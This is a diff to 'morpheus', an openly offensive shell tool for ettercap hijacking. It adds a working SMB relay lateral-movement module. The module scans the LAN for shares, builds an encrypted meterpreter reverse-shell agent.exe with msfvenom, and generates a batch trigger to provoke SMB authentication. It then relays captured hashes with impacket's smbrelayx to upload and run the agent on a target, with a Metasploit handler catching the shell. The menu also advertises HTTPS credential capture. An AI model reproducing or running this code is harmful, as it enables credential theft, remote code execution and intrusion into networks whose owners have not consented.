@@ -1,7 +1,7 @@
 #!/bin/sh
 ###
 # morpheus - automated ettercap TCP/IP Hijacking tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 2.1
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 2.2
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2018
 # codename: oneiroi_phobetor [ GPL licensed ]
 #
@@ -53,7 +53,7 @@ Reset="${Escape}[0m";
 # Variable declarations
 # ---------------------
 dtr=`date | awk '{print $4}'`        # grab current hour
-V3R="2.1"                            # module version number
+V3R="2.2"                            # module version number
 cnm="oneiroi_phobetor"               # module codename
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
@@ -2710,6 +2710,157 @@ fi
 
 
 
+
+
+
+
+# ----------------------------------------------------
+# C&C SMBrelay attack (c&c smb exploit)
+# ----------------------------------------------------
+sh_stage21 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}In morpheus SMB Relay lateral movement attack we will need 2 pcs  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}(attacker,target) the attacker machine will wait for any smb auth ${BlueF}|"
+echo "${BlueF}    | ${YellowF}attempts in local lan and uses the hashs captured to authenticate ${BlueF}|"
+echo "${BlueF}    | ${YellowF}itself on target machine to upload and execute remote our agent.  ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+
+
+
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+#
+# config module settings ..
+#
+echo ${BlueF}[☠]${white} Enter module settings!${Reset};
+sleep 2
+lhost=$(zenity --title="☠ Enter  payload LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter  payload LPORT ☠" --text "example: 666" --entry --width 270) > /dev/null 2>&1
+
+
+# select RHOST ..
+scnt=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "Scan LAN for active shares" FALSE "Input target ip address [RHOST]" --width 320 --height 200) > /dev/null 2>&1
+
+if [ "$scnt" = "Scan LAN for active shares" ];then
+  dtr=`date | awk {'print $4'}`
+  ip_range=`ip route | grep "kernel" | awk {'print $1'}`
+  nmap -sS -Pn -T4 --script smb-enum-shares.nse -p 445,139 $IP_RANGE -oN $IPATH/logs/lan.txt | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan .." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+  cat $IPATH/logs/lan.txt | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 570 --height 470 > /dev/null 2>&1
+  rm $IPATH/logs/lan.txt > /dev/null 2>&1
+  rhost=$(zenity --title="☠ Enter  target RHOST ☠" --text "example: 192.168.1.100" --entry --width 270) > /dev/null 2>&1
+else
+  rhost=$(zenity --title="☠ Enter  target RHOST ☠" --text "example: 192.168.1.100" --entry --width 270) > /dev/null 2>&1
+fi
+
+
+  #
+  # start metasploit services
+  #
+  echo ${BlueF}[☠]${white} Start metasploit services ..${Reset};
+  service postgresql start > /dev/null 2>&1
+    if [ "$RbUdB" = "YES" ]; then
+      echo ${BlueF}[${GreenF}✔${BlueF}]${white} Rebuild msfdb [database] ..${Reset};
+      msfdb delete > /dev/null 2>&1
+      msfdb init > /dev/null 2>&1
+    fi
+
+
+  #
+  # check dependencies ..
+  #
+  echo ${BlueF}[☠]${white} Check module dependencies ..${Reset};
+  sleep 2
+  if [ -d /opt/impacket ]; then
+    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Python impacket libs found ..${Reset};
+    sleep 2
+  else
+    echo ${BlueF}[${RedF}x${BlueF}]${white} Python impacket libs not found ..${Reset};
+    sleep 2
+    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Installing impacket python libs ..${Reset};
+    echo ""
+    cd /opt
+    git clone https://github.com/CoreSecurity/impacket.git
+    cd impacket 
+    pip install ldap3
+    python setup.py install
+    echo ""
+  fi
+
+
+#
+# build payload and trigger
+#
+echo ${BlueF}[☠]${white} Building rc4 agent.exe ..${Reset};
+sleep 2
+xterm -T "MORPHEUS - BUILD AGENT.EXE" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f exe -n 20 -o $IPATH/output/agent.exe"
+
+
+#
+# parse modem ip address ..
+#
+# parsing data (192.168.1.) [print first 10 chars]
+# parse=`echo $IP | grep "192" | cut -c1-10`
+# delete last 3 chars from string
+# v1=`ifconfig | grep "broadcast" | awk {'print $6'}`
+# v2=`echo ${v1::-3}`
+#
+# remove everything after the final [ . ]
+parse=`echo ${IP%.*}`
+
+# Now, lets simulate the scanner (trigger.bat) by attempting to connect to the C$
+# of our attackers Linux box (192.168.1.71) from the scanner server (192.168.1.19)
+# STRING: FOR /L %%i IN (1,1,255) DO dir \\192.168.1.%%i\c$
+echo ${BlueF}[☠]${white} Building trigger.bat ..${Reset};
+sleep 2
+cd $IPATH/bin
+sed "s|RePlAcE|$parse|g" trigger.bat > done.bat
+mv done.bat $IPATH/output/trigger.bat
+
+#
+# final notes ..
+#
+zenity --title "☠ FINAL NOTES ☠" --text "Morpheus its now ready to use the SmbRelay lateral\nmovement attack as soon we click the 'yes' button.\n\nIf we wish to [ manually ] trigger the vulnerability\nthen we are going to need a 3º PC were we are going\nto execute the [ trigger.bat ] file to simulate one smb\nauth attempt on local lan so that morpheus can use\nthat captured credentials to upload/execute our\nagent.exe into target PC [ RHOST ]" --info --width 360 --height 270 > /dev/null 2>&1
+
+
+#
+# smbrelay attack
+#
+cd $IPATH/bin/Utils
+echo ""
+python smbrelayx.py -h $rhost -e $IPATH/output/agent.exe & xterm -T "MORPHEUS - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp_rc4; set RC4PASSWORD phobetor; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
+echo ""
+
+#
+# clean
+#
+echo ${BlueF}[☠]${white} cleaning old files .. ${Reset};
+sleep 2
+service postgresql stop > /dev/null 2>&1
+cd $IPATH/output/
+killall python > /dev/null 2>&1
+rm trigger.bat > /dev/null 2>&1
+
+
+#
+# abort button pressed ..
+#
+else
+  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
+
+
+
 # ------------------------------------------------
 # NMAP FUNTION TO REPORT LIVE TARGETS IN LOCAL LAN
 # ------------------------------------------------
@@ -2854,7 +3005,7 @@ Colors;
 while :
 do
 clear
-echo "" && echo "${BlueF}                 ☆ 𝓪𝓾𝓽𝓸𝓶 𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆${BlueF}"
+echo "" && echo "${BlueF}                 ☆ 𝓪𝓾𝓽𝓸𝓶𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆${BlueF}"
 cat << !
     ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
     ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
@@ -2886,7 +3037,8 @@ cat << !
     |  17    -  Devices DHCP discovery          -  devices modem auth   |
     |  18    -  Block cpu crypto-minning        -  drop/kill packets    |
     |  19    -  Redirect browser traffic        -  to google pranks     |
-    |  20    -  Capture https credentials       -  sslstrip + dns2proxy |
+    |  20    -  Capture https credentials       -  sslstrip+dns2proxy   |
+    |  21    -  SMBrelay lateral movement       -  C&C SMBRelay exploit |
     |                                                                   |
     |   W    -  Write your own filter                                   |
     |   S    -  Scan LAN for live hosts                                 |
@@ -2920,7 +3072,8 @@ case $choice in
 18) sh_stage18 ;;
 19) sh_stage19 ;;
 20) sh_stage20 ;;
-# 20) echo "[x] Please Wait, Under develop .."; sleep 1.3 ;;
+21) sh_stage21 ;;
+# 21) echo "[x] Please Wait, Under develop .."; sleep 1.3 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
 S) sh_stageS ;;
